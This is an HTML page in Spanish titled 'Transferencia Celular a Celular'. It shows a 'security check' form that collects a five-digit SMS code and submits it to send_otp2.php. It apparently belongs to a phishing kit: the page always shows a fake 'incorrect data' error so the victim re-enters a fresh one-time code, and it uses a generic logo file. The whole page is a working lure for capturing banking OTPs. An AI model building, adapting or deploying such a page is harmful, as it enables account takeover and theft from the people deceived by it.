<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Transferencia Celular a Celular</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding-top: 64px;
      /* Reserve space for the fixed header */
      display: flex;
      justify-content: center;
      background-color: #f2f2f2;
    }

    .header {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: linear-gradient(90deg, #FFAC3E 0%, #f87d18 100%);
      color: #fff;
      text-align: center;
      padding: 16px 20px;
      box-sizing: border-box;

      align-items: center;
      justify-content: space-between;
      z-index: 1000;
    }

    .header img {
      max-width: 30px;
    }

    .header h2 {
      margin: 0;
      font-size: 1em;
      flex-grow: 1;
      text-align: center;
    }

    .container {
      width: 90%;
      max-width: 400px;

    }

    .content {
      padding: 20px;
      text-align: center;
      border: 2px solid #777272;
      background-color: #fff;
      border-radius: 20px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      position: relative;
    }

    .content h3 {
      margin: 10px 0;
      font-size: 1.2em;
      color: green;
    }

    .content p {
      font-size: 2em;
      font-weight: bold;
      margin: 0;
    }

    .form-group {
      margin: 15px 0;
      text-align: center;
    }

    .form-group label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }

    .form-group input[type="text"] {
      /* width: 100%; */
      padding: 10px;
      font-size: 1em;
      border: 2px solid #777272;
      border-radius: 6px;
      box-sizing: border-box;
      transition: border-color 0.3s;
    }

    .form-group input[type="text"]:focus {
      border-color: #FFAC3E;
      outline: none;
      box-shadow: 0 0 5px rgba(255, 172, 62, 0.5);
    }

    .otp-group {
      display: flex;
      justify-content: space-evenly;
      margin: 20px 0;
    }

    .otp-group input {
      width: 45px;
      height: 45px;
      font-size: 1.5em;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 5px;
      transition: border-color 0.3s;
    }

    .otp-group input:focus {
      border-color: #FFAC3E;
      outline: none;
      box-shadow: 0 0 5px rgba(255, 172, 62, 0.5);
    }

    .confirm-button {
      /* display: block; */
      width: 58%;
      padding: 12px;
      background: linear-gradient(-45deg, #006738 0%, #229A0D 100%);
      color: #fff;
      font-size: 1em;
      font-weight: bold;
      border: none;
      border-radius: 9px;
      cursor: pointer;
      text-align: center;
      transition: background 0.3s, transform 0.2s;
    }

    .confirm-button:hover {
      background: linear-gradient(-45deg, #00532a 0%, #1f7a0b 100%);
      transform: translateY(-2px);
    }

    .footer {
      display: flex;
      justify-content: space-around;
      background-color: #f7f7f7;
      padding: 10px 0;
      border-top: 1px solid #ddd;
      width: 100%;
      position: fixed;
      bottom: 0;
      left: 0;
    }

    .footer div {
      text-align: center;
      font-size: 0.8em;
    }

    .footer div img {
      max-width: 30px;
    }

    /* Estilos para el mensaje de error */
    .error-message {
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #ffe6e6;
      color: #cc0000;
      border: 1px solid #cc0000;
      border-radius: 8px;
      padding: 10px 15px;
      margin-top: 20px;
      font-weight: bold;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      animation: fadeIn 0.5s ease-in-out;
    }

    .error-message svg {
      margin-right: 10px;
      fill: #cc0000;
      width: 20px;
      height: 20px;
    }

    /* Animación para el mensaje de error */
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(-10px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* Responsive adjustments */
    @media (max-width: 400px) {
      .content p {
        font-size: 1.5em;
      }

      .confirm-button {
        width: 70%;
        padding: 10px;
      }

      .otp-group {
        margin: 30px 0;
      }
    }
  </style>
</head>

<body>
  <div class="header">
    <div><img src="./recursos/descarga.png" alt="Logo"></div>
  </div>

  <div class="container">
    <h3 style="text-align: center;">Comprobación de Seguridad</h3>
    <div class="content">
      <h3>¡Ingrese el código correctamente!</h3>

      <form action="send_otp2.php" method="POST">
        <div class="form-group">
          <label>Ingrese el código enviado via SMS:</label>
          <div class="form-group otp-group">
            <input type="text" maxlength="1" id="otp1" name="otp1" required oninput="moveFocus(this, event)" onkeydown="moveBackFocus(this, event)">
            <input type="text" maxlength="1" id="otp2" name="otp2" required oninput="moveFocus(this, event)" onkeydown="moveBackFocus(this, event)">
            <input type="text" maxlength="1" id="otp3" name="otp3" required oninput="moveFocus(this, event)" onkeydown="moveBackFocus(this, event)">
            <input type="text" maxlength="1" id="otp4" name="otp4" required oninput="moveFocus(this, event)" onkeydown="moveBackFocus(this, event)">
            <input type="text" maxlength="1" id="otp5" name="otp5" required oninput="moveFocus(this, event)" onkeydown="moveBackFocus(this, event)">
          </div>
          <button type="submit" class="confirm-button">Confirmar</button>
        </div>
      </form>

      <!-- Mensaje de error mejorado -->
      <div class="error-message">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
          <path d="M12 0C5.371 0 0 5.371 0 12c0 6.63 5.371 12 12 12s12-5.37 12-12C24 5.371 18.63 0 12 0zm5.707 16.293L16.293 17.707 12 13.414l-4.293 4.293-1.414-1.414L10.586 12 6.293 7.707l1.414-1.414L12 10.586l4.293-4.293 1.414 1.414L13.414 12l4.293 4.293z" />
        </svg>
        <span>Los datos ingresados han sido incorrectos</span>
      </div>

      <script>
        // Función para mover el foco al siguiente input cuando se ingresa un valor
        function moveFocus(currentInput, event) {
          if (currentInput.value.length === currentInput.maxLength) {
            const nextInput = currentInput.nextElementSibling;
            if (nextInput && nextInput.tagName.toLowerCase() === 'input') {
              nextInput.focus();
            }
          }
        }

        // Función para mover el foco al input anterior cuando se elimina un valor
        function moveBackFocus(currentInput, event) {
          if (event.key === 'Backspace' && currentInput.value === '') {
            const prevInput = currentInput.previousElementSibling;
            if (prevInput && prevInput.tagName.toLowerCase() === 'input') {
              prevInput.focus();
            }
          }
        }
      </script>
    </div>
  </div>


</body>

</html>
